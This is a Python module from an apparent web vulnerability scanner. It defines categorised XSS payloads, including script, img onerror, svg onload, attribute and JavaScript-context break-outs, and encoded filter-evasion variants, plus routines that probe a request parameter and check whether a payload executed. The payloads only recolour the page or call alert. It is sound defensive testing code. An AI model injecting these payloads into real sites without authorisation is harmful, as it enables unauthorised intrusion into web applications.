"""Shared XSS payloads and visual DOM execution evaluation utilities.

Provides categorized visual XSS injection payloads, pre-flight symbol/tag filtering,
and DOM execution verification shared across Reflected, Stored, and DOM XSS detectors.
"""

from __future__ import annotations

import logging
from typing import Any

from dast.http_client import HTTPClient

logger = logging.getLogger(__name__)

# Robust visual marker used to verify XSS in DOM / HTML
XSS_VISUAL_MARKER = "document.body.style.backgroundColor='red';document.body.insertAdjacentHTML('afterbegin','<h1>dastXSS</h1>')"

XSS_PAYLOADS: dict[str, list[str]] = {
    # Standard HTML Body Injections
    "script": [
        "<script>document.body.style.backgroundColor='red';document.body.insertAdjacentHTML('afterbegin','<h1>dastXSS</h1>')</script>",
        "<script>alert(1)</script>",
        "<sCrIpt>document.body.style.backgroundColor='red';document.body.insertAdjacentHTML('afterbegin','<h1>dastXSS</h1>')</sCrIpt>",
        "<scr<script>ipt>document.body.style.backgroundColor='red';document.body.insertAdjacentHTML('afterbegin','<h1>dastXSS</h1>')</scr<script>ipt>",
    ],

    # Self-executing image/media handlers (bypasses simple <script> filters in DVWA Medium / bWAPP)
    "img": [
        "<img src=x onerror=\"document.body.style.backgroundColor='red';document.body.insertAdjacentHTML('afterbegin','<h1>dastXSS</h1>')\">",
        "<img/src=x/onerror=\"document.body.style.backgroundColor='red';document.body.insertAdjacentHTML('afterbegin','<h1>dastXSS</h1>')\">",
        "><img src=x onerror=\"document.body.style.backgroundColor='red';document.body.insertAdjacentHTML('afterbegin','<h1>dastXSS</h1>')\">",
        "<img src=1 onerror=alert(1)>",
    ],

    # SVG vectors (works across modern browsers and XML/XHTML DOM contexts)
    "svg": [
        "<svg onload=\"document.body.style.backgroundColor='red';document.body.insertAdjacentHTML('afterbegin','<h1>dastXSS</h1>')\">",
        "<svg/onload=\"document.body.style.backgroundColor='red';document.body.insertAdjacentHTML('afterbegin','<h1>dastXSS</h1>')\">",
        '"><svg/onload="document.body.style.backgroundColor=\'red\';document.body.insertAdjacentHTML(\'afterbegin\',\'<h1>dastXSS</h1>\')">',
        "<sVg onload=alert(1)>",
        "<svg><script>document.body.style.backgroundColor='red';document.body.insertAdjacentHTML('afterbegin','<h1>dastXSS</h1>')</script></svg>",
    ],

    # Attribute break-outs (e.g. <input value="INJECTION"> or <option value="INJECTION">)
    "attribute": [
        '"><script>document.body.style.backgroundColor="red";document.body.insertAdjacentHTML("afterbegin","<h1>dastXSS</h1>")</script>',
        '"><img src=x onerror="document.body.style.backgroundColor=\'red\';document.body.insertAdjacentHTML(\'afterbegin\',\'<h1>dastXSS</h1>\')">',
        '" onfocus="document.body.style.backgroundColor=\'red\';document.body.insertAdjacentHTML(\'afterbegin\',\'<h1>dastXSS</h1>\')" autofocus="',
        "' onfocus=\"document.body.style.backgroundColor='red';document.body.insertAdjacentHTML('afterbegin','<h1>dastXSS</h1>')\" autofocus='",
        '" autofocus onfocus="alert(1)" x="',
        '</option></select><img src=x onerror="document.body.style.backgroundColor=\'red\';document.body.insertAdjacentHTML(\'afterbegin\',\'<h1>dastXSS</h1>\')">',
    ],

    # JavaScript literal context breakouts (e.g. <script>var x = 'INJECTION';</script>)
    "js_context": [
        "'-alert(1)-'",
        "\";document.body.style.backgroundColor='red';document.body.insertAdjacentHTML('afterbegin','<h1>dastXSS</h1>');//",
        "';document.body.style.backgroundColor='red';document.body.insertAdjacentHTML('afterbegin','<h1>dastXSS</h1>');//",
        "</script><script>document.body.style.backgroundColor='red';document.body.insertAdjacentHTML('afterbegin','<h1>dastXSS</h1>')</script>",
        "${alert(1)}",
    ],

    # Encoded / Obfuscated script payloads
    "encoded_script": [
        "<script>document.body.style.backgroundColor=String.fromCharCode(114,101,100);document.body.insertAdjacentHTML('afterbegin','<h1>dastXSS</h1>')</script>",
        "<script>\\u0064ocument.body.style.backgroundColor='red';document.body.insertAdjacentHTML('afterbegin','<h1>dastXSS</h1>')</script>",
    ],

    # Pointer / User interaction event triggers
    "pointer": [
        "<div onpointerover=\"document.body.style.backgroundColor='red';document.body.insertAdjacentHTML('afterbegin','<h1>dastXSS</h1>')\">X</div>",
        "<div onpointerdown=\"document.body.style.backgroundColor='red';document.body.insertAdjacentHTML('afterbegin','<h1>dastXSS</h1>')\">X</div>",
    ],
}


def analyze_reflection_context(response_text: str, probe_marker: str) -> dict[str, Any]:
    """Inspect response HTML to determine the reflection context (body, attribute, script, etc.)."""
    context = {
        "reflected": False,
        "in_attribute": False,
        "in_script": False,
        "can_use_tag": False,
        "can_use_double_quote": False,
        "can_use_single_quote": False,
        "quote_char": None,
    }

    if not response_text or probe_marker not in response_text:
        return context

    context["reflected"] = True

    # Check unencoded character reflections
    context["can_use_tag"] = f"{probe_marker}<" in response_text or (f"{probe_marker}&lt;" not in response_text and "<" in response_text)
    context["can_use_double_quote"] = f'{probe_marker}"' in response_text or (f"{probe_marker}&quot;" not in response_text and '"' in response_text)
    context["can_use_single_quote"] = f"{probe_marker}'" in response_text or ("&#39;" not in response_text and "&#x27;" not in response_text and "'" in response_text)

    # Heuristic context check: Is the probe marker inside a <script> block?
    idx = response_text.find(probe_marker)
    if idx != -1:
        # Check if preceding unclosed <script> exists
        before = response_text[:idx].lower()
        last_script_open = before.rfind("<script")
        last_script_close = before.rfind("</script")
        if last_script_open > last_script_close:
            context["in_script"] = True

        # Check if preceding unclosed tag attribute exists (e.g. <input value="marker...>)
        last_tag_open = before.rfind("<")
        last_tag_close = before.rfind(">")
        if last_tag_open > last_tag_close:
            context["in_attribute"] = True
            # Check quote type
            segment = before[last_tag_open:]
            if segment.count('"') % 2 == 1:
                context["quote_char"] = '"'
            elif segment.count("'") % 2 == 1:
                context["quote_char"] = "'"

    return context


def filter_applicable_xss_payloads(
    client: HTTPClient,
    url: str,
    method: str = "GET",
    param: str = "q",
    default_data: dict[str, Any] | None = None,
) -> list[str]:
    """Pre-flight probe to detect filtered/encoded symbols, tags, and context without saving screenshots.
    Returns prioritized candidate payloads for browser visual execution.
    """
    probe_marker = "xss_prb_92"
    probe_value = f"{probe_marker}<>\"'/"
    data = dict(default_data or {})
    data[param] = probe_value

    try:
        if method.upper() == "POST":
            resp, _, _ = client.post(url, data=data)
        else:
            resp, _, _ = client.get(url, params=data)
        resp_text = resp.text if resp else ""
    except Exception:
        resp_text = ""

    ctx = analyze_reflection_context(resp_text, probe_marker)

    selected_payloads: list[str] = []
    seen = set()

    # Prioritize based on detected context
    categories_to_check: list[str] = []
    if ctx["in_script"]:
        categories_to_check = ["js_context", "script", "svg", "img", "attribute", "encoded_script"]
    elif ctx["in_attribute"]:
        categories_to_check = ["attribute", "img", "svg", "script", "encoded_script"]
    else:
        categories_to_check = ["script", "img", "svg", "attribute", "js_context", "encoded_script", "pointer"]

    for cat in categories_to_check:
        payloads = XSS_PAYLOADS.get(cat, [])
        for p in payloads:
            if p in seen:
                continue
            seen.add(p)

            # Filter out payloads requiring tag brackets if < > are strictly stripped/encoded and not in script
            if not ctx["can_use_tag"] and ("<" in p or ">" in p) and not ctx["in_script"]:
                continue

            # Filter out attribute break-outs if quotes are sanitized
            if p.startswith('">') and not ctx["can_use_double_quote"]:
                continue
            if p.startswith("'>") and not ctx["can_use_single_quote"]:
                continue

            selected_payloads.append(p)

    # Fallback if filtering eliminated everything
    if not selected_payloads:
        for plist in XSS_PAYLOADS.values():
            for p in plist:
                if p not in seen:
                    seen.add(p)
                    selected_payloads.append(p)

    return selected_payloads


def is_xss_executed(response_text: str, payload: str, browser: Any | None = None) -> bool:
    """Check if visual XSS payload executed in DOM or reflected unencoded in executable context."""
    if browser:
        has_dom_exec = hasattr(browser, "check_xss_dom_execution") and browser.check_xss_dom_execution()
        has_dialog = hasattr(browser, "has_dialog") and browser.has_dialog()
        if has_dom_exec or has_dialog:
            return True

    if not response_text:
        return False

    # Filter out inert attribute assignments where user input is trapped inside an inert src/href attribute (e.g. <script src="...">)
    if payload and payload in response_text:
        if f"src='{payload}'" in response_text or f'src="{payload}"' in response_text or f"src={payload}" in response_text:
            return False
        if f"href='{payload}'" in response_text or f'href="{payload}"' in response_text or f"href={payload}" in response_text:
            return False
        # Filter out cases where < > are HTML-entity encoded (e.g. &lt;script&gt;)
        if "<" in payload and (f"&lt;{payload[1:]}" in response_text or "&lt;" in response_text):
            return False
        if '"' in payload and ("&quot;" in response_text or "&#34;" in response_text):
            return False
        if "'" in payload and ("&#39;" in response_text or "&#x27;" in response_text):
            return False
        # If payload contains no HTML tags/closers or event handlers (e.g. js_context payloads like '-alert(1)-'),
        # it is only executable if reflected inside an existing <script> block
        if "<" not in payload and ">" not in payload and "on" not in payload.lower():
            pos = response_text.find(payload)
            before = response_text[:pos].lower()
            last_script_open = before.rfind("<script")
            last_script_close = before.rfind("</script")
            if last_script_open == -1 or last_script_open < last_script_close:
                return False
        return True

    # Check unencoded reflection of visual execution script markers resulting from DOM execution
    if ("document.body.style.backgroundColor" in response_text or "background-color: red" in response_text or "background-color:red" in response_text) and ("<h1>dastXSS</h1>" in response_text or "dastXSS" in response_text or "<h1>XSS</h1>" in response_text):
        if f"src='{payload}'" not in response_text and f'src="{payload}"' not in response_text and f"src={payload}" not in response_text:
            return True

    return False
